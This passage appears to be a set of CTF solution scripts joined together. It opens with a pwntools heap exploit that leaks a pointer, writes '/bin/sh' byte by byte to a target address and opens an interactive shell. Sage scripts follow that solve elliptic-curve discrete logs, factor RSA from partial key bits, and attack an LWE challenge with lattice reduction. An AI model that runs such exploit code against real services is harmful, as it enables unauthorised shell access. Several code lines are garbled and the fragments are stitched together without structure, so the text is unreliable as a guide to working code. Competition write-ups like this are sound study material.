    p.send(data)
    p.recvuntil('Show me the money: ')
    heap_ptr += int(p.recvuntil('\n'))*0x10000
    data = gen_leak_payload(0x23)
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    p.recvuntil('Show me the money: ')
    heap_ptr += int(p.recvuntil('\n'))*0x1000000
    log.success('{:#x}'.format(heap_ptr))
    data = gen_write_payload(0x8EC2C0 - heap_ptr + 0x90 + 0, ord('/'))
    #data = gen_write_payload(0x10000000, ord('s'))
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    # print(pidof(p))
    # input()
    p.send(data)
    data = gen_write_payload(0x8EC2C0 - heap_ptr + 0x90 + 1, ord('b'))
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    data = gen_write_payload(0x8EC2C0 - heap_ptr + 0x90 + 2, ord('i'))
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
Crypto
ecc
椭圆曲线基础攻击*3
    data = gen_write_payload(0x8EC2C0 - heap_ptr + 0x90 + 3, ord('n'))
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    data = gen_write_payload(0x8EC2C0 - heap_ptr + 0x90 + 4, ord('/'))
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    data = gen_write_payload(0x8EC2C0 - heap_ptr + 0x90 + 5, ord('s'))
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    data = gen_write_payload(0x8EC2C0 - heap_ptr + 0x90 + 7, 0)
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    data = gen_write_payload(0x8EC2C0 - heap_ptr + 0x90 + 6, ord('h'))
    p.recvuntil('size: ')
    p.sendline(str(len(data)))
    p.send(data)
    p.interactive()
if __name__ == '__main__':
    main()
from Crypto.Util.number import long_to_bytes
flag = b''
# ecc1
p = 146808027458411567
A = 46056180
B = 2316783294673
E = EllipticCurve(GF(p),[A,B])
P = E(119851377153561800, 50725039619018388)
Q = E(22306318711744209, 111808951703508717)
flag += long_to_bytes(P.discrete_log(Q))
# ecc2
p = 1256438680873352167711863680253958927079458741172412327087203
A = 377999945830334462584412960368612
B = 604811648267717218711247799143415167229480
E = EllipticCurve(GF(p),[A,B])
P = E(550637390822762334900354060650869238926454800955557622817950, 
700751312208881169841494663466728684704743091638451132521079)
Q = E(1152079922659509908913443110457333432642379532625238229329830, 
819973744403969324837069647827669815566569448190043645544592)
moduli = []
residues = []
n = E.order()
fac = list(factor(n))
for i,j in fac:
    modules=i**j
    if i > 1> (t-i-1)) & 1
        TT = add_augmented(TT, TT)
        if bit == 1:
            TT = add_augmented(TT, PP)
    return TT
def solve_ecdlp(P,Q,p):
    R1, alpha = scalar_mult(p, [P,0])
    R2, beta  = scalar_mult(p, [Q,0])
    return ZZ(beta*alpha^(-1))
flag += long_to_bytes(solve_ecdlp(P,Q,E.order()))
print(b"flag{" + flag + b"}")
from Crypto.Util.number import *
from tqdm import tqdm
def partial_p(p0, kbits, n):
    PR. = PolynomialRing(Zmod(n))
    f = 2^kbits*x + p0
    f = f.monic()
    roots = f.small_roots(X=2^(512-400), beta=0.3) 
    if roots:
        x0 = roots[0]
        p = gcd(2^kbits*x0 + p0, n)
        return ZZ(p)
c = 
105964363167029753317572454629861988853017240482625184064844073337324793672813917218384
090143000754327745478675938880417939070185062842148984326409733470784229289982384422482
806913011867971401975586627392549938483496950331331884487290714985591554789594767069838
17882517886102203599090653816022071957312164735
e = 65537
n = 
815599054523576230594296466834224773629521672826636854019516950697929531495505089150571
001015653246885188695521583529737751254954893566702531313365761932974303729967331671178
606145379293856743513854262637214465790534033773659967440192462352514342856581969664407
81084168142352073493973147145455064635516373317
x = 
544528274874907263426386536858394514838784460789819080620775891616788086097329057778520
781763108994646626718779325717092
class Solver:
    def __init__(self, x, n):
        self.x = x
        self.n = n
        self.pq = [(0, 0)]
    def add(self, b, p, q):
        # print(bin((p * q) & (2*b-1)))
        # print(bin(n & (2*b-1)))
        if (p * q) & (2*b-1) == n & (2*b-1):
            self.pq.append((p, q))
    def solve(self):
        for shift in tqdm(range(0, 400)):
            b = 1 << shift
            pq, self.pq = self.pq, []
            for p, q in pq:
                if self.x & b:
                    self.add(b, p | b, q)
                    self.add(b, p, q | b)
                else:
                    self.add(b, p, q)
                    self.add(b, p | b, q | b)
        return self.pq
def solve():
    solver = Solver(x,n)
    pqs = solver.solve()
    for pq in tqdm(pqs):
        p0 = ZZ(pq[0])
        p = partial_p(p0, 400, n)
        if p and p != 1:
            return p
doublesage
p = solve()
if not p:
    print('WTF')
    exit(0)
q = n//p
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = long_to_bytes(pow(c,d,n))
print(m)
from pwn import *
from sage.modules.free_module_integer import IntegerLattice
from random import randint
import sys
from itertools import starmap
from operator import mul
# Babai's Nearest Plane algorithm
# from: http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/
def Babai_closest_vector(M, G, target):
  small = target
  for _ in range(1):
    for i in reversed(range(M.nrows())):
      c = ((small * G[i]) / (G[i] * G[i])).round()
      small -= M[i] * c
  return target - small
io = remote("122.112.210.186", 51436)
q = 29
io.recvuntil(b'Matrix A of size 5 * 23 :\n')
a = []
a.append(eval(io.recvline().decode().replace('[ ','[').replace('  ',' ').replace(' ',', 
')))
a.append(eval(io.recvline().decode().replace('[ ','[').replace('  ',' ').replace(' ',', 
')))
a.append(eval(io.recvline().decode().replace('[ ','[').replace('  ',' ').replace(' ',', 
')))
a.append(eval(io.recvline().decode().replace('[ ','[').replace('  ',' ').replace(' ',', 
')))
a.append(eval(io.recvline().decode().replace('[ ','[').replace('  ',' ').replace(' ',', 
')))
print(a)
io.recvuntil(b'Vector C of size 1 * 23 :\n')
c = eval(io.recvline().decode().replace('[ ','[').replace('  ',' ').replace(' ',', '))
print(c)
A_values = matrix(a).T
b_values = vector(ZZ, c)
m = 23
n = 5
A = matrix(ZZ, m + n, m)
for i in range(m):
  A[i, i] = q
for x in range(m):
  for y in range(n):
    A[m + y, x] = A_values[x][y]
lattice = IntegerLattice(A, lll_reduce=True)
print("LLL done")
gram = lattice.reduced_basis.gram_schmidt()[0]
target = vector(ZZ, b_values)
res = Babai_closest_vector(lattice.reduced_basis, gram, target)
print("Closest Vector: {}".format(res))